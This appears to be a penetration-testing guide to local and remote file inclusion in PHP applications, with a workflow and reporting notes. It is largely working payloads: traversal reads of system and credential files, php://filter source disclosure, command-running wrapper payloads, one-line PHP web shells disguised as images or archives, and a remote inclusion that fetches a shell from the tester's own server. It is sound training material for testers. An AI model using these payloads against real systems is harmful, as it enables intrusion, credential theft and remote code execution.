## Local File Inclusion And Remote File Inclusion

### Why It Matters

File inclusion flaws often start as "read a file" issues but can escalate into:

- source code disclosure
- credential disclosure
- log poisoning or upload-assisted RCE
- PHP wrapper abuse
- remote code execution in poorly configured cases

The important skill is understanding what the application is doing with the parameter: read, include, parse, or execute.

### Recognition Cues

Look for parameters such as:

- `page=`
- `file=`
- `template=`
- `lang=`
- `view=`
- `module=`

Strong hints:

- error messages mentioning `include`, `require`, or template loading
- language or theme selectors
- PDF, help, and content rendering features
- paths visible in error output

### Workflow

1. identify the file-handling parameter
2. test local file reads with traversal
3. determine whether only reading is possible or true inclusion occurs
4. test wrapper, log, or upload-assisted escalation where justified
5. prove impact with the smallest reliable technique

### Basic LFI Tests

```text
/index.php?language=/etc/passwd
/index.php?language=../../../../etc/passwd
/index.php?language=/../../../etc/passwd
/index.php?language=./languages/../../../../etc/passwd
/index.php?language=../../../../../../usr/share/tomcat9/conf/tomcat-users.xml
```

Good first targets:

- `/etc/passwd`
- `C:\Windows\win.ini`
- application config files
- framework settings
- web server virtual host files

### Traversal Bypasses

If basic traversal fails, test encoding and normalization tricks:

```text
/index.php?language=....//....//....//....//etc/passwd
/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
/index.php?language=../../../../etc/passwd%00
/index.php?language=php://filter/read=convert.base64-encode/resource=config.php
```

These matter when:

- the app strips `../` incompletely
- null bytes affect extension handling
- wrappers are enabled

### Source Disclosure With `php://filter`

If the target is PHP, `php://filter` is often one of the best outcomes:

```text
/index.php?language=php://filter/read=convert.base64-encode/resource=config.php
```

This is valuable because raw source often reveals:

- database credentials
- API keys
- include paths
- secret tokens

### When LFI Becomes RCE

RCE usually needs an extra primitive. Common routes:

- PHP wrappers
- log poisoning
- upload plus inclusion
- archive wrappers such as `zip://` or `phar://`

### PHP Wrapper Abuse

```text
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://<server>/index.php?language=php://input&cmd=id"
```

```text
/index.php?language=expect://id
```

These only work when the relevant wrappers are enabled and the application truly includes rather than only reads.

### LFI Plus Upload

If you can upload a file and later include it, that is often the cleanest path to RCE.

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```text
/index.php?language=./profile_images/shell.gif&cmd=id
```

Archive-based examples:

```text
/index.php?language=zip://shell.zip%23shell.php&cmd=id
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

### Log Poisoning

If you can inject PHP into access logs or other readable logs, and the vulnerable parameter includes that log file, you may turn LFI into code execution.

The exact path depends on the target:

- Apache access logs
- Nginx access logs
- auth logs
- application logs

### RFI

Remote file inclusion is less common on modern systems but high impact when present.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server <listening_port>
```

```text
/index.php?language=http://<our_ip>:<listening_port>/shell.php&cmd=id
```

This depends on insecure remote inclusion behavior and permissive PHP settings.

### What To Read First

After confirming read access, prioritize:

- application source
- `.env` or config files
- database credentials
- SSH keys
- user session files
- logs

### Pitfalls

- treating path traversal and inclusion as the same thing
- assuming RCE without a second primitive
- missing source disclosure because the app base64-encodes output
- wasting time on RFI where remote inclusion is clearly disabled

### Reporting Notes

Capture:

- the vulnerable parameter
- whether the issue was traversal, local inclusion, or remote inclusion
- the file(s) read
- whether source code or secrets were disclosed
- whether escalation to RCE was possible

### Fast Checklist

```text
1. Identify include-style parameter
2. Prove local file read
3. Test traversal and wrapper bypasses
4. Pull source or credentials first
5. Check for upload, log, or wrapper-assisted RCE
6. Save request, file output, and impact evidence
```
